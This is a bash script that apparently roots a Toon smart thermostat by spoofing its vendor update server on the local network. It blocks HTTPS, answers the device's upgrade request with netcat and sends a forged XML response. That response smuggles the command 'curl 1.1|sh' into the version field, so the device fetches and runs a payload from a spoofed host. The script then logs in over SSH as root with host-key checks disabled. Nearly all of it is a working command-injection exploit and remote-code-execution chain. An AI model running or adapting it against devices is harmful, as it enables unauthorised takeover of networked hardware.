#!/bin/bash

function kill_recurse() {
    cpids=`pgrep -P $1|xargs`
    for cpid in $cpids;
    do
        kill_recurse $cpid
    done
    echo "killing $1"
    kill -9 $1
}


#cleanup earlier bad runs
rm -f /tmp/pipe.in
rm -f /tmp/pipe.out
/sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
killall -9 nc 2>/dev/null
killall -9 cat 2>/dev/null


if netstat -anp | grep LISTEN | grep ":80 "
then
 echo "Please shutdown this appliction which is using port 80 because we need it to root the toon."
# exit
fi


if ! [ $1 ] 
then
 echo "Default payload loaded: Kill qt-gui"
 PAYLOAD="killall -9 qt-gui"
else
 [ -f $1 ] || exit "Payload file does not exists!"
 PAYLOAD=`cat $1`
fi

echo "Blocking all HTTPS (and therefore Toon VPN). Reboot your toon now. And after that press the 'software' button on your Toon."
/sbin/iptables -I FORWARD -p tcp --dport 443 -j DROP

#OUTPUT=`/usr/sbin/tcpdump -n -i any dst net 172.16.0.0/12  and port 31080 -c 1 2>/dev/null` || exit "tcpdump failed"
OUTPUT=`/usr/sbin/tcpdump -n -i any port 31080 -c 1 2>/dev/null` || exit "tcpdump failed"
TOONIP=`echo $OUTPUT | cut -d\  -f3 | cut -d\. -f1,2,3,4`
IP=`echo $OUTPUT | cut -d\  -f5 | cut -d\. -f1,2,3,4`

[ -f /tmp/pipe.in ] || /usr/bin/mkfifo /tmp/pipe.in
[ -f /tmp/pipe.out ] || /usr/bin/mkfifo /tmp/pipe.out

echo "The Toon from $TOONIP is connecting to servicecenter IP: $IP"
echo "Let's have some fun!"

/sbin/ip addr add 1.0.0.1/32 dev lo 2>/dev/null
/sbin/ip addr add $IP/32 dev lo 2>/dev/null


RESPONSE='HTTP/1.1 200 OK\n\n


<action xmlns:u="http://schema.homeautomationeurope.com/quby" class="response" uuid="0429a450-bd0c-11e0-962b-0800200c9a66" destuuid="_DESTUUID_" destcommonname="_DESTCOMMONNAME_" requestid="_REQUESTID_" serviceid="urn:hcb-hae-com:serviceId:specific1">\n
  <u:GetUpgradeResponse xmlns:u="http://schema.homeautomationeurope.com/quby">\n
    <DoUpgrade>true</DoUpgrade>\n
    <Ver>5.;curl 1.1|sh;;</Ver>\n
    <Success>true</Success>\n
    <Reason>Success</Reason>\n
    <ReasonDetails>Success</ReasonDetails>\n
  </u:GetUpgradeResponse>\n
</action>\n
'

DONE=false

while ! $DONE 
do
cat /tmp/pipe.out | nc -q 0 -Nl 31080 | tee /tmp/pipe.in &

while read line
do
echo $LINE
if [[ $line = *"action class"* ]]
then
  COMMONNAME=`echo $line | sed 's/.* commonname="\(.*\)".*/\1/'`
  UUID="$COMMONNAME:hcb_config" 
  REQUESTID=`echo $line | sed 's/.* requestid="\(.*\)" .*/\1/'`
  TOSEND=`echo $RESPONSE | sed "s/_REQUESTID_/$REQUESTID/" | sed "s/_DESTCOMMONNAME_/$COMMONNAME/" | sed "s/_DESTUUID_/$UUID/" `
fi
if [[ $line = *"<u:GetUpgrade"* ]]
then
  echo "Received valid update request. Sending the reponse for the upgrade request and starting payload process in background"
  timeout 80 bash -c "echo '$PAYLOAD' | nc -q 2 -Nl 1.0.0.1 80 " &
  PAYLOAD_PID=$!
  echo -e $TOSEND > /tmp/pipe.out
  DONE=true
elif [[ $line = *"<u:"* ]]
then
  echo "This is not a update request."
  echo "" > /tmp/pipe.out
fi
  
done < /tmp/pipe.in

done


echo ""
echo "The response payload has been sent. Now waiting for the Toon to pick up the remote shell script. Depending on the firmware of the Toon this can take a minute or so."
wait $PAYLOAD_PID
SUCCESS=$?
ip addr del $IP/32 dev lo
ip addr del 1.0.0.1/32 dev lo
rm -f /tmp/pipe.in
rm -f /tmp/pipe.out
/sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP

if [ $SUCCESS -ne 0 ] 
then
  echo "Response payload was not sent. Please try again"
  exit
fi
if [ "$PAYLOAD" == "killall -9 qt-gui" ] 
then
  echo "Done sending the payload!"
  exit
fi


echo "Done sending the payload! Following the toon root log file now to see progress"
sleep 2

CURLOUTPUT=`curl --connect-timeout 1 http://$TOONIP/rsrc/log 2>/dev/null`
echo "$CURLOUTPUT"
while ! echo $CURLOUTPUT | grep -q "Finished fixing files"
do
	sleep 1
	CURLOUTPUT=`curl --connect-timeout 1 http://$TOONIP/rsrc/log 2>/dev/null`
	clear
	echo "$CURLOUTPUT"
done
ssh-keygen -f "/root/.ssh/known_hosts" -R $TOONIP
ssh -o StrictHostKeyChecking=no root@$TOONIP
